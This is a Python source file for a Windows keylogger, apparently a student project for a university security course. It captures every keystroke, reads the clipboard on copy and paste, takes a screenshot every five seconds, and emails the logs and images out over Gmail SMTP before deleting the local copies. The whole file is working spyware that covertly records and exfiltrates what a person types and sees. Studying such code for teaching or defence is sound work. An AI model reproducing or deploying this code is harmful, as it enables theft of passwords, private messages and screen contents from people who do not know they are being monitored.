# Author: Saurav Gupta
# Course: COMP6841
# Year: 2021
# OS: Windows

# A keylogger application that will log every keyboard button and command pressed by the user in a txt file
# The application will log text that is copied/pasted using CTRL-C/CTRL-V
# The applicaiton takes a screenshot of the users screen every 5 seconds
# The log file and screenshot is emailed to the user every 5 seconds 

from pynput.keyboard import Key, Listener
import sys
from datetime import datetime
import time
import threading
import smtplib
from key_sub import key_sub
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
import config
import os
import win32clipboard
import pyautogui


log = []
# written_file = None

# for easy exit of program
exit_signal = False


def on_press(key):
    key = str(key).strip('\'')
    
    if key in key_sub:
        key = key_sub[key]
        log.append(key)
        print(key)

        # for easy exit of program
        if key == "[CTRL-T]":
            global exit_signal
            exit_signal = True
            sys.exit()
        # get clipboard if user does copy/paste
        if key == "[CTRL-C]" or key == "[CTRL-V]":
            clipboard = get_clipboard()
            log.append(f"**CLIPBOARD CONTENT after {key} press**")
            log.append(clipboard)
            log.append("**END CLIPBOARD CONTENT**")
    else:
        log.append(key)
        print(key)

def write_log_to_file():
    '''
    write log variable to a txt file
    '''
    global log

    # do nothing if log is empty
    if len(log) == 0:
        return None    

    print("Writing...")
    # filename is time it was created
    filename = "keylogger_" + datetime.now().strftime("%d-%m-%Y-%H-%M-%S") + ".txt"
    with open(filename, 'w+') as f: 
        f.write('\n'.join(log))
    del log[:]

    return filename

def take_screenshot():
    '''
    take screenshot of user screen
    '''
    im1 = pyautogui.screenshot()
    filename = datetime.now().strftime("%d-%m-%Y-%H-%M-%S") + ".png"
    im1.save(filename)
    return filename

def email_file(screenshot_file):
    '''
    email txt file 
    '''
    # create the email
    print("Emailing...")
    msg = MIMEMultipart()
    msg['Subject'] = 'Keylogger file'
    msg['From'] = config.email
    msg['To'] = config.email
    body = "Please find the keylogger file attached.\n\nKind Regards,\nJon Smith"
    msg.attach(MIMEText(body, 'plain'))

    # get current directory 
    path = os.getcwd()
    # get all files in parent
    files = os.listdir(path)
    # get all paths of .txt files
    paths = [basename for basename in files if basename.endswith('.txt')]

    # email all .txt file in directory
    for path in paths:
        with open(path, "rb") as attachment:
            # Add file as application/octet-stream
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
        part.add_header("Content-Disposition", f"attachment; filename= {path}")
        msg.attach(part)

    # attach screenshot
    with open(screenshot_file, "rb") as attachment:
        image = MIMEImage(attachment.read(), name=os.path.basename(screenshot_file))
        msg.attach(image)

    # simple mail transfer protocol object 
    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as smtpObj:
            # connect to email and authenticate
            smtpObj.ehlo()
            smtpObj.starttls()
            smtpObj.login(config.email, config.password)
            smtpObj.sendmail(config.email, config.email, msg.as_string())
    except Exception as e:
        print(e)

    # return all files that were emailed
    paths.append(screenshot_file)
    return paths

def del_file(filename):
    '''
    delete existing log file
    '''
    if filename:
        os.remove(filename)

def get_clipboard():
    '''
    get user clipboard when they press ctrl+c or ctrl+v
    '''
    time.sleep(0.01) #buffer to give windows time to store copied text into clipboard
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    print(data)
    return data


def output_thread():
    '''
    threaded function to email file to user
    allows other thread to continue logging keys
    while email is being sent
    '''
    while True:
        if exit_signal:
            break
        time.sleep(5)
        screenshot_file = take_screenshot()
        written_file = write_log_to_file()
        files = email_file(screenshot_file)
        for f in files:
            del_file(f)


if __name__ == "__main__":
    thread = threading.Thread(target=output_thread)
    thread.start()
    with Listener(on_press=on_press) as l:
        l.join()